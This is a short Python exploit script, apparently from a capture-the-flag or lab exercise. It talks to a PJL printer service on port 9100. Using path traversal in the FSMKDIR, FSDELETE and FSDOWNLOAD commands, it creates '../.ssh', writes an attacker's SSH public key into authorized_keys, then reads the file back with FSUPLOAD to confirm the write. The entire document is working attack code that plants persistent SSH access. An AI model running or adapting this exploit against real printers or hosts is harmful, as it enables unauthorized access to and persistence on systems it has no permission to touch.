#!/usr/bin/env python3
import socket

KEY = b"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHd2jjZHAM69tyxWab23os5aDLAjABySY04Zxxw14x41 kali@kali\n"
PATH = "../.ssh/authorized_keys"
N = len(KEY)

def talk(payload: bytes) -> bytes:
    s = socket.socket()
    s.settimeout(10)
    s.connect(("127.0.0.1", 9100))
    s.sendall(payload)
    out = b""
    try:
        while True:
            c = s.recv(4096)
            if not c:
                break
            out += c
    except socket.timeout:
        pass
    s.close()
    return out

talk(b'@PJL FSMKDIR NAME="../.ssh"\r\n')
talk(f'@PJL FSDELETE NAME="{PATH}"\r\n'.encode())

# write: FSDOWNLOAD multiline (upload semantics on box)
w = f'@PJL FSDOWNLOAD NAME="{PATH}"\r\nSIZE={N}\r\n'.encode() + KEY
print("W1", talk(w)[:80])
print("Q", talk(b'@PJL FSQUERY NAME="../.ssh"\r\n'))

# verify read via FSUPLOAD multiline
r = talk(b'@PJL FSUPLOAD NAME="../.ssh/authorized_keys"\r\nOFFSET=0\r\nSIZE=200\r\n')
print("R", len(r), r[:150])